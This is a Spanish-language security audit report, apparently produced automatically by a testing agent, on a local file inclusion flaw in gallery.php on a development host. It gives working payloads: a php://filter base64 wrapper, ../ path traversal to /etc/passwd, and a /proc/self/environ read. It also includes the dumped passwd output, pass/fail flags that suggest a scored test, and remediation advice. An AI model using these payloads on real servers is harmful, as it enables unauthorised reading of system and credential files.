VULN_FOUND: true
VULN_EXPLOITED: true

Resumen:
Se realizó un análisis LFI contra http://web.dev.local:8081. La página vulnerable es gallery.php que acepta el parámetro "page" y permite inclusión de archivos locales.

Pruebas realizadas y resultados:
- Nikto escaneó el host y descubrió /config.php como archivo revelador.
- Acceso a / (homepage) listado de enlaces a gallery.php?page=...
- Prueba con php://filter para /etc/passwd devolvió el contenido codificado en base64 y se decodificó con éxito, confirmando LFI con filtros PHP.
  - URL utilizada: http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
  - Resultado (base64): cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=
  - Decodificado: /etc/passwd content (se incluyó con éxito)
- Prueba de inclusión directa de /etc/passwd también devolvió el contenido en claro.
  - URL utilizada: http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
- Intento de lectura de /proc/self/environ devolvió errores por permisos, pero la inclusión fallida confirmó que la funcionalidad include() de PHP se estaba usando.
  - URL utilizada: http://web.dev.local:8081/gallery.php?page=../../../../../../proc/self/environ

Impacto:
- Exposición de ficheros sensibles del sistema (ej. /etc/passwd). Posible lectura de archivos de configuración, claves, y otras credenciales si existen y son accesibles por el usuario del proceso web.

Recomendaciones:
1. Validar y sanear el parámetro "page". Usar un listado blanco (whitelist) de páginas permitidas en lugar de aceptar rutas arbitrarias.
2. Evitar el uso de include() con entradas del usuario. Usar mapeo interno de identificadores a rutas seguras.
3. Deshabilitar wrappers peligrosos o validar esquemas (e.g., php://) si no son necesarios.
4. Restringir permisos de archivos sensibles y ejecutar procesos web con el menor privilegio necesario.

Evidencia (peticiones relevantes):
- GET /gallery.php?page=php://filter/convert.base64-encode/resource=/etc/passwd -> returned base64 of /etc/passwd
- GET /gallery.php?page=../../../../etc/passwd -> returned /etc/passwd
- GET /gallery.php?page=../../../../../../proc/self/environ -> include() failed, showing PHP warnings referencing gallery.php line 104

Notas:
- Nikto también reveló /config.php, pero su lectura directa fue denegada cuando se intentó con rutas relativas; sin embargo, la presencia sugiere ficheros de configuración susceptibles.

Archivo generado automáticamente por el auditor.
